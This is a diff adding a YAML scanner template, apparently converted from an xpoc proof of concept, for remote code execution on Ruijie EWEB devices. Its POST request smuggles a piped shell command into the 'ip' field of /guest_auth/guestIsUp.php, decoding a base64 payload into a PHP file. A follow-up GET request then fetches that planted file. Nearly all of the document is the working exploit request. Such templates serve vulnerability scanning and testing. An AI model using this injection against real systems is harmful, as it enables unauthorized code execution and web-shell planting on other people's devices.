@@ -1,0 +1,28 @@
+id: yaml-poc-ruijie-eweb-rce-CT-158830
+info:
+  name: Yaml Poc Ruijie Eweb Rce Ct 158830
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-ruijie-eweb-rce-CT-158830'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /guest_auth/guestIsUp.php
+  body: 'ip=127.0.0.1|echo ''{{payload}}'' | base64 -d > {{r2}}.php&mac=00-00
+
+    '
+  headers:
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /guest_auth/{{r2}}.php
+  headers:
+    Accept-Encoding: gzip, deflate
